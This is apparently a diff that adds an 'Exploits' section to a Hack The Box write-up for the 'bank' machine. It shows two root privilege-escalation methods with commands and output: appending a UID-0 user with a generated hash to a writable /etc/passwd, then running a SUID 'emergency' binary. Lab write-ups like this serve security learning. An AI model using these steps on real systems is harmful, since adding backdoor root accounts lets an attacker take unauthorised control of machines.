@@ -795,3 +795,77 @@ This sequence of commands and actions depicts steps taken during a penetration t
 It's a systematic approach to identifying vulnerabilities and potential attack vectors during a penetration testing engagement. Further steps may involve exploiting discovered vulnerabilities to escalate privileges and gain deeper access to the target system.
 
 ## Exploits
+
+### Writable /etc/passwd
+
+```bash
+# on the remote machine, get the password hash from openssl as below
+www-data@bank:/var/www/bank/uploads$ openssl passwd -1 P@ssword1!       
+openssl passwd -1 P@ssword1!
+$1$pwkb5t.S$NoHDeEhSIZke0vni9akQK0
+
+# append your own user to /etc/passwd as root 
+echo 'tyla:$1$pwkb5t.S$NoHDeEhSIZke0vni9akQK0:0:0:gotcha:/root:/bin/bash' >> /etc/passwd 
+
+# verify the entry in /etc/passwd file 
+# it will be the last entry as below
+www-data@bank:/var/www/bank/uploads$ cat /etc/passwd                
+cat /etc/passwd                                                         ...      
+tyla:$1$pwkb5t.S$NoHDeEhSIZke0vni9akQK0:0:0:gotcha:/root:/bin/bash
+
+# now ssh as that user and you are the root
+ssh tyla@bank.htb          
+The authenticity of host 'bank.htb (10.10.10.29)' can't be established.
+ED25519 key fingerprint is SHA256:7S4JgORJLloHIy/gCCkxvRpbrpWXAlMs8QK2jFtpn/w.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'bank.htb' (ED25519) to the list of known hosts.
+tyla@bank.htb's password:  
+Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-79-generic i686)
+
+  System information as of Sun Nov 19 10:00:07 EET 2023
+
+  System load: 0.4               Memory usage: 4%   Processes:       84
+  Usage of /:  7.4% of 28.42GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+Your Hardware Enablement Stack (HWE) is supported until April 2019.
+Last login: Fri Jun 16 07:44:56 2017
+root@bank:~# 
+```
+
+This sequence of commands demonstrates a method for achieving privilege escalation by adding a new user to the `/etc/passwd` file and then accessing the system as the newly created user. Let's break down the steps:
+
+1. **Obtaining Password Hash**:
+   - The `openssl passwd -1` command is used to generate a password hash for the password "P@ssword1!". The resulting hash is `$1$pwkb5t.S$NoHDeEhSIZke0vni9akQK0`.
+
+2. **Appending User to `/etc/passwd`**:
+   - The `echo` command is utilised to append a new user entry to the `/etc/passwd` file. The entry includes the username "tyla", the password hash obtained earlier, and other necessary fields such as user ID (`0` for root), group ID (`0` for root), user information, home directory, and shell.
+
+3. **Verifying Entry in `/etc/passwd`**:
+   - The contents of the `/etc/passwd` file are displayed using the `cat` command to confirm that the new user entry has been successfully added.
+
+4. **SSH Login as New User**:
+   - SSH login is attempted using the newly created user "tyla" with the password "P@ssword1!". Upon successful authentication, access to the system is granted, and the user is logged in as root.
+
+This series of actions highlights a critical misconfiguration in the system where the `/etc/passwd` file is writable by non-privileged users. By exploiting this misconfiguration, an attacker can effectively add a new user with root privileges, thereby gaining unauthorised access to the system. It underscores the importance of proper file permission management and regular security audits to mitigate such risks.
+
+### SUID
+
+```bash
+# check the file type 
+# it indicates a binary 
+file /var/htb/bin/emergency 
+file /var/htb/bin/emergency
+/var/htb/bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
+
+# now simply execute the binary and see what happens
+# you are the root
+/var/htb/bin/emergency 
+/var/htb/bin/emergency
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+whoami
+root
+```
